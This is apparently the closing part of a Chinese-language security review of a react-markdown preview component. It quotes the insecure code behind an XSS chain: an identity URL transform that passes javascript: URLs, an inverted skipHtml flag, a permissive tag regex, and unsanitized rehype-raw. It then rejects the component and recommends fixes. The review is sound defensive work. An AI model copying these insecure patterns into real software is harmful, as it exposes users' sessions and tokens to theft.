1. **URL 消毒完全禁用**（S1）: `defaultUrlTransform = (url) => url` 完全绕过了 react-markdown 内置的 URL 安全过滤，允许 `javascript:`/`data:` 协议 URL 通过，直接导致反射型 XSS
2. **skipHtml 语义反转**（S2）: `skipHtml={!skipHtml}` 导致安全控制与实际渲染行为矛盾，开发者可能误配置
3. **HTML 标签白名单形同虚设**（S3）: `/^[A-Za-z0-9]+$/` 仅检查标签名格式，`script`/`iframe`/`svg`/`object` 等危险标签全部放行

这三个问题**相互叠加**，形成了完整的 XSS 攻击链：恶意 Markdown → URL 不消毒 → 弱标签过滤 → 语义反转导致 HTML 渲染 → XSS 触发。

### 纵深防御对比

```
当前防御层（全线崩溃）:                建议防御层（纵深防御）:

┌───────────────────────┐            ┌───────────────────────┐
│ URL 消毒: ❌ 禁用      │            │ URL 消毒: ✅ 白名单    │ ← S1
│        │               │            │        │               │
│        ▼               │            │        ▼               │
│ 标签过滤: ⚠️ 仅格式检查│            │ 标签过滤: ✅ 严格白名单│ ← S3
│        │               │            │        │               │
│        ▼               │   ──→     │        ▼               │
│ skipHtml: ⚠️ 语义反转  │            │ skipHtml: ✅ 语义一致  │ ← S2
│        │               │            │        │               │
│        ▼               │            │        ▼               │
│ rehype-raw: ❌ 无过滤  │            │ rehype-sanitize: ✅   │ ← S4
│        │               │            │        │               │
│        ▼               │            │        ▼               │
│ DOM 输出: 🔴 XSS 可行  │            │ DOM 输出: ✅ 安全渲染  │
└───────────────────────┘            └───────────────────────┘
```

### 与其他评审的交叉引用

| 安全问题 | 相关组件 | 关联说明 |
|----------|---------|----------|
| S1 URL 消毒 | Props.tsx | `urlTransform` prop 类型定义在此 |
| S2 skipHtml | Props.tsx | `skipHtml` prop 默认值定义在此 |
| S3 标签白名单 | react-markdown-preview/index.tsx | 上层组件传递 allowElement |
| S4 rehype-raw | Props.tsx | `rehypePlugins` prop 类型定义 |

### 最终建议

**评审结论: 🔴 REJECT — 不通过**

在本项目的安全上下文中，`preview.tsx` 的安全风险**不可接受**。三个 P0 级缺陷形成了完整的 XSS 攻击链，且本项目将 JWT 存储在 localStorage（可被 XSS 读取），一旦 XSS 被利用，攻击者可获取管理员 Token 并完全控制系统。

**紧急建议**:
- **立即**: 在本项目中包装 preview.tsx 的上层组件，传入安全的 `urlTransform` 和 `allowElement`
- **短期**: 向 `@uiw/react-markdown-preview` 提交安全 issue 报告这三个缺陷
- **中期**: 评估是否 fork 并自行修复，或迁移到更安全的 Markdown 渲染方案
